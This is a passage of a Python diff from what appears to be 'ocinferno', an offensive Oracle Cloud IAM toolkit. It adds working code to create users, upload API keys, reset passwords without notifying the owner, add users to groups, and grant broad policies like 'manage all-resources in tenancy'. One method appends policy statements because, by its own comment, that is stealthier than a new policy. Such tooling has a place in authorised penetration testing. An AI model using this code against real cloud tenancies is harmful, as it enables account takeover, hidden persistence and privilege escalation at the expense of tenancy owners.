+        return ApiKey(mode="idd", user_ocid=self.ocid, fingerprint=_s(data.get("fingerprint")),
+                      key_id=_s(data.get("ocid") or data.get("id")))
+
+    def create_api_key(self, session, *, public_pem: str, description: str = "", force_idd: bool = False) -> ApiKey:
+        """Add an API key, choosing the write path that actually works.
+
+        LIVE FINDING (domain-based tenancy, Cloud Shell delegation): the classic
+        ``IdentityClient.upload_api_key`` path works for BOTH classic-IAM and identity-domain
+        users and is honored by a delegation/instance-principal session, whereas the IDD SCIM
+        path (``IdentityDomainsClient.create_api_key`` -> ``/admin/v1/ApiKeys``) additionally
+        requires IDCS domain-admin authorization and returned 401 accessDenied under delegation.
+
+        So classic is the default. IDD is used only when ``force_idd`` is set (caller knows they
+        hold IDCS admin), or as an automatic fallback when classic is denied (401/403) and a
+        domain URL is known.
+        """
+        if force_idd:
+            return self.create_api_key_idd(session, public_pem=public_pem, description=description)
+
+        try:
+            return self.create_api_key_oci(session, public_pem=public_pem)
+        except Exception as classic_err:
+            status = getattr(classic_err, "status", None)
+            if status in (401, 403) and self.domain_url:
+                print(f"{UtilityTools.YELLOW}[!] Classic api-key path denied ({status}); "
+                      f"falling back to the identity-domain (SCIM) path...{UtilityTools.RESET}")
+                key = self.create_api_key_idd(session, public_pem=public_pem, description=description)
+                key.fell_back_from_classic = True
+                return key
+            raise
+
+    # -------------------------------------------------------------------
+    # Creation
+    # -------------------------------------------------------------------
+    @classmethod
+    def create_oci(cls, session, *, name: str, description: str = "", compartment_id: str = "", email: str = "") -> "User":
+        """Create a classic IAM user (in the tenancy root unless a compartment is given)."""
+        client = cls._classic_client(session)
+        tenancy, _ = _tenancy_and_region(session)
+        comp = _s(compartment_id) or tenancy
+        if not comp:
+            raise ValueError("could not resolve a compartment/tenancy for the new user")
+        details = oci.identity.models.CreateUserDetails(
+            compartment_id=comp, name=name,
+            description=description or "ocinferno-created user", email=email or None,
+        )
+        resp = client.create_user(details)
+        data = oci.util.to_dict(getattr(resp, "data", None)) or {}
+        return cls(kind="classic", ocid=_s(data.get("id")), name=_s(data.get("name") or name))
+
+    @classmethod
+    def create_idd(cls, session, *, domain_url: str, user_name: str, email: str = "",
+                    family_name: str = "", given_name: str = "") -> "User":
+        """Create an identity-domain user via the domain SCIM endpoint."""
+        if not _s(domain_url):
+            raise ValueError("identity-domain user requires the domain URL (--domain-url).")
+        client = cls._idd_client(session, domain_url)
+        m = oci.identity_domains.models
+        primary_email = email or (user_name if "@" in user_name else f"{user_name}@example.invalid")
+        body = m.User(
+            schemas=[IDD_USER_SCHEMA],
+            user_name=user_name,
+            name=m.UserName(family_name=family_name or user_name, given_name=given_name or None),
+            emails=[m.UserEmails(value=primary_email, type="work", primary=True)],
+            active=True,
+        )
+        resp = client.create_user(user=body)
+        data = oci.util.to_dict(getattr(resp, "data", None)) or {}
+        return cls(kind="idd", ocid=_s(data.get("ocid")), scim_id=_s(data.get("id")),
+                   name=_s(data.get("user_name") or user_name), domain_url=domain_url)
+
+    @classmethod
+    def create(cls, session, *, force_idd: bool = False, **kw) -> "User":
+        """Dispatch to the classic or identity-domain create path."""
+        if force_idd:
+            return cls.create_idd(
+                session, domain_url=_s(kw.get("domain_url")), user_name=_s(kw.get("name")),
+                email=_s(kw.get("email")), family_name=_s(kw.get("family_name")), given_name=_s(kw.get("given_name")),
+            )
+        return cls.create_oci(
+            session, name=_s(kw.get("name")), description=_s(kw.get("description")),
+            compartment_id=_s(kw.get("compartment_id")), email=_s(kw.get("email")),
+        )
+
+    # -------------------------------------------------------------------
+    # Password
+    # -------------------------------------------------------------------
+    def reset_password_oci(self, session) -> Dict[str, Any]:
+        """Classic: set/reset the console (UI) password and return it. OCI's
+        create_or_reset_ui_password is the same call whether this is a first-time set
+        (right after user creation) or a later reset."""
+        client = self._classic_client(session)
+        resp = client.create_or_reset_ui_password(user_id=self.ocid)
+        data = oci.util.to_dict(getattr(resp, "data", None)) or {}
+        return {"mode": "classic", "user_ocid": self.ocid, "password": data.get("password")}
+
+    def reset_password_idd(self, session, *, bypass_notification: bool = False) -> Dict[str, Any]:
+        """IDD: reset via UserPasswordResetter. bypass_notification=True returns a one-time
+        password directly (admin, no email); False sends a reset email to the account email."""
+        sid = self._resolve_scim_id(session)
+        client = self._idd_client(session, self.domain_url)
+        body = oci.identity_domains.models.UserPasswordResetter(
+            schemas=[PW_RESETTER_SCHEMA], bypass_notification=bool(bypass_notification),
+        )
+        resp = client.put_user_password_resetter(user_password_resetter_id=sid, user_password_resetter=body)
+        data = oci.util.to_dict(getattr(resp, "data", None)) or {}
+        return {
+            "mode": "idd", "user_ocid": self.ocid, "scim_id": sid,
+            "one_time_password": data.get("one_time_password"),
+            "notified": not bool(bypass_notification),
+        }
+
+    # -------------------------------------------------------------------
+    # Email
+    # -------------------------------------------------------------------
+    def update_email_oci(self, session, *, email: str = "", description: str = "") -> Dict[str, Any]:
+        client = self._classic_client(session)
+        details = oci.identity.models.UpdateUserDetails(email=email or None, description=description or None)
+        resp = client.update_user(user_id=self.ocid, update_user_details=details)
+        data = oci.util.to_dict(getattr(resp, "data", None)) or {}
+        return {"mode": "classic", "user_ocid": self.ocid, "email": data.get("email")}
+
+    def update_email_idd(self, session, *, email: str) -> Dict[str, Any]:
+        sid = self._resolve_scim_id(session)
+        client = self._idd_client(session, self.domain_url)
+        op = oci.identity_domains.models.Operations(op="REPLACE", path='emails[type eq "work"].value', value=email)
+        patch = oci.identity_domains.models.PatchOp(schemas=[PATCHOP_SCHEMA], operations=[op])
+        resp = client.patch_user(user_id=sid, patch_op=patch)
+        data = oci.util.to_dict(getattr(resp, "data", None)) or {}
+        return {"mode": "idd", "user_ocid": self.ocid, "scim_id": sid, "email": email, "raw_emails": data.get("emails")}
+
+
+class Group(_DualPathClientMixin):
+    """An OCI IAM group -- classic IAM group or identity-domain (IDD) group."""
+
+    def __init__(self, *, kind: str, ocid: str, name: str = "", scim_id: str = "",
+                 domain_ocid: str = "", domain_url: str = ""):
+        self.kind = kind
+        self.ocid = _s(ocid)
+        self.name = _s(name)
+        self.scim_id = _s(scim_id)
+        self.domain_ocid = _s(domain_ocid)
+        self.domain_url = _s(domain_url)
+
+    def label(self) -> str:
+        return f"{self.name or '<unnamed>'} | {self.kind.upper()} | {self.ocid}"
+
+    def to_dict(self) -> Dict[str, str]:
+        return {"kind": self.kind, "ocid": self.ocid, "name": self.name, "scim_id": self.scim_id,
+                "domain_ocid": self.domain_ocid, "domain_url": self.domain_url}
+
+    @classmethod
+    def from_dict(cls, d: Dict[str, Any]) -> "Group":
+        return cls(kind=_s(d.get("kind")) or "classic", ocid=_s(d.get("ocid")), name=_s(d.get("name")),
+                   scim_id=_s(d.get("scim_id")), domain_ocid=_s(d.get("domain_ocid")), domain_url=_s(d.get("domain_url")))
+
+    @classmethod
+    def collect_all(cls, session) -> List["Group"]:
+        """Merged group list from saved enumeration: classic IAM groups + domain groups."""
+        out: List[Group] = []
+        for r in (session.get_resource_fields(TABLE_GROUPS) or []):
+            if isinstance(r, dict) and _s(r.get("id")).startswith("ocid1.group"):
+                out.append(cls(kind="classic", ocid=_s(r.get("id")), name=_s(r.get("name"))))
+
+        domain_url_by_ocid: Dict[str, str] = {}
+        for d in (session.get_resource_fields(TABLE_IDENTITY_DOMAINS) or []):
+            if isinstance(d, dict):
+                domain_url_by_ocid[_s(d.get("id"))] = _s(d.get("url"))
+
+        for r in (session.get_resource_fields(TABLE_IDD_GROUPS) or []):
+            if not isinstance(r, dict):
+                continue
+            ocid = _s(r.get("ocid"))
+            if not ocid.startswith("ocid1.group"):
+                continue
+            dom = _s(r.get("domain_ocid"))
+            out.append(cls(kind="idd", ocid=ocid, scim_id=_s(r.get("id")), name=_s(r.get("display_name")),
+                           domain_ocid=dom, domain_url=domain_url_by_ocid.get(dom, "")))
+        return out
+
+    def _resolve_scim_id(self, session) -> str:
+        """IDD group writes key off the group SCIM id; resolve + cache it from the OCID if
+        not already known."""
+        if self.scim_id:
+            return self.scim_id
+        client = self._idd_client(session, self.domain_url)
+        rows = client.list_groups(filter=f'ocid eq "{self.ocid}"').data.resources or []
+        if rows and getattr(rows[0], "id", None):
+            self.scim_id = rows[0].id
+            return self.scim_id
+        raise ValueError(f"could not resolve identity-domain SCIM id for group {self.ocid}")
+
+    # -------------------------------------------------------------------
+    # Live enumeration (used by enumerate_principals below)
+    # -------------------------------------------------------------------
+    @staticmethod
+    def _fetch_idd_from_domain(session, idd_ops, *, dom_id: str, dom_name: str, domain_url: str, compartment_id: str) -> List[Dict[str, Any]]:
+        rows = [IdentityHelperUtils.normalize_idd_group(g) for g in (idd_ops.list_identity_domain_groups() or []) if isinstance(g, dict)]
+        for r in rows:
+            idd_ops.apply_domain_context(r, domain_id=dom_id, domain_name=dom_name, domain_url=domain_url, compartment_id=compartment_id)
+        return rows
+
+    @staticmethod
+    def _fetch_classic(session, classic_ops, *, compartment_id: str) -> List[Dict[str, Any]]:
+        return classic_ops.list_groups(compartment_id=compartment_id) or []
+
+    def add_member_oci(self, session, user: "User") -> Dict[str, Any]:
+        client = self._classic_client(session)
+        details = oci.identity.models.AddUserToGroupDetails(user_id=user.ocid, group_id=self.ocid)
+        resp = client.add_user_to_group(details)
+        data = oci.util.to_dict(getattr(resp, "data", None)) or {}
+        return {"mode": "classic", "user_ocid": user.ocid, "group_ocid": self.ocid, "membership_id": data.get("id")}
+
+    def remove_member_oci(self, session, *, membership_id: str) -> None:
+        self._classic_client(session).remove_user_from_group(user_group_membership_id=membership_id)
+
+    def add_member_idd(self, session, user: "User") -> Dict[str, Any]:
+        """Add a user to a domain group via SCIM patch (op ADD to `members`)."""
+        group_scim_id = self._resolve_scim_id(session)
+        user_scim_id = user._resolve_scim_id(session, domain_url=self.domain_url)
+        client = self._idd_client(session, self.domain_url)
+        op = oci.identity_domains.models.Operations(op="ADD", path="members", value=[{"value": user_scim_id, "type": "User"}])
+        patch = oci.identity_domains.models.PatchOp(schemas=[PATCHOP_SCHEMA], operations=[op])
+        resp = client.patch_group(group_id=group_scim_id, patch_op=patch)
+        data = oci.util.to_dict(getattr(resp, "data", None)) or {}
+        return {"mode": "idd", "user_ocid": user.ocid, "user_scim_id": user_scim_id, "group_scim_id": group_scim_id,
+                "member_count": len(data.get("members") or [])}
+
+
+class Policy(_DualPathClientMixin):
+    """An OCI IAM policy -- always classic (identity domains have no separate policy engine)."""
+
+    def __init__(self, *, ocid: str = "", name: str = "", compartment_id: str = "",
+                 statements: Optional[List[str]] = None):
+        self.ocid = _s(ocid)
+        self.name = _s(name)
+        self.compartment_id = _s(compartment_id)
+        self.statements: List[str] = list(statements or [])
+
+    @staticmethod
+    def build_statement(
+        *, subject_kind: str, subject_value: str = "", subject_domain: str = "", verb: str = "manage",
+        resource: str = "all-resources", scope: str = "tenancy", target_ocid: str = "",
+    ) -> str:
+        """Compose one policy statement.
+
+        subject_kind: 'any-user' | 'user' (any-user + request.user.id condition) |
+                      'group' | 'dynamic-group'.
+        subject_domain: identity domain qualifier for group/dynamic-group subjects. In a
+                        domain-based tenancy a group must be named ``'Domain'/'Group'`` (the
+                        default domain can usually be omitted for back-compat). OCID-based
+                        subjects (any-user/user) are domain-agnostic and ignore this.
+        scope: 'tenancy' (root) or a compartment name/OCID.
+        """
+        kind = _s(subject_kind)
+
+        def _qualified(name: str) -> str:
+            return f"'{_s(subject_domain)}'/'{name}'" if _s(subject_domain) else name
+
+        if kind in ("any-user", "user"):
+            subj = "any-user"
+        elif kind == "group":
+            subj = f"group {_qualified(subject_value)}"
+        elif kind == "dynamic-group":
+            subj = f"dynamic-group {_qualified(subject_value)}"
+        else:
+            raise ValueError(f"unknown subject_kind: {subject_kind}")
+
+        scope_clause = "in tenancy" if _s(scope).lower() in ("", "tenancy", "root", "tenancy-root") \
+            else f"in compartment {scope}"
+        stmt = f"Allow {subj} to {verb} {resource} {scope_clause}"
+        if kind == "user" and _s(target_ocid):
+            stmt += f" where request.user.id = '{target_ocid}'"
+        return stmt
+
+    @classmethod
+    def create(cls, session, *, name: str, statements: List[str], compartment_id: str = "", description: str = "") -> "Policy":
+        client = cls._classic_client(session)
+        tenancy, _ = _tenancy_and_region(session)
+        comp = _s(compartment_id) or tenancy
+        if not comp:
+            raise ValueError("could not resolve a compartment/tenancy for the policy")
+        details = oci.identity.models.CreatePolicyDetails(
+            compartment_id=comp, name=name, statements=list(statements),
+            description=description or "ocinferno-created policy",
+        )
+        resp = client.create_policy(details)
+        data = oci.util.to_dict(getattr(resp, "data", None)) or {}
+        return cls(ocid=_s(data.get("id")), name=_s(data.get("name") or name), compartment_id=comp,
+                   statements=data.get("statements") or list(statements))
+
+    def append_statements(self, session, new_statements: List[str]) -> "Policy":
+        """Update this policy by APPENDING statements (stealthier than a new policy)."""
+        client = self._classic_client(session)
+        existing = oci.util.to_dict(getattr(client.get_policy(policy_id=self.ocid), "data", None)) or {}
+        merged = list(existing.get("statements") or []) + list(new_statements)
+        details = oci.identity.models.UpdatePolicyDetails(statements=merged)
+        resp = client.update_policy(policy_id=self.ocid, update_policy_details=details)
+        data = oci.util.to_dict(getattr(resp, "data", None)) or {}
+        self.statements = data.get("statements") or merged
+        self.name = _s(data.get("name")) or self.name
+        return self
+
+    def delete(self, session) -> None:
+        """Not referenced by any exploit wrapper -- kept for CRUD completeness."""
+        self._classic_client(session).delete_policy(policy_id=self.ocid)
+
